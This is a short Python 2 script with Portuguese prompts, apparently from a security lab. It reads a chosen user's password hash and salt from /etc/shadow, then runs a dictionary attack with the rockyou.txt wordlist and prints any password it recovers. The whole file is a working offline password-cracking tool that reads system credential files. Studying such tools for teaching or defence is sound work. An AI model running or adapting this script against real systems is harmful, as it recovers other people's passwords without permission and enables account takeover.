import crypt

user = raw_input('Insira o nome do usuario a interceptar: ')

with open('/etc/shadow') as shadow:
	for line in shadow:
		if user in line:
			to_break = line
hash = to_break.split(":")[1]

salt = hash[:hash.find("$",3)+1]

with open('/home/ufrnkali/Downloads/rockyou.txt') as wordlist:
	for line in wordlist:
		line=line.rstrip()
		generated_hash=crypt.crypt(line, salt)
		if(generated_hash==hash):
			print "User", user
			print "Passwd", line
			break
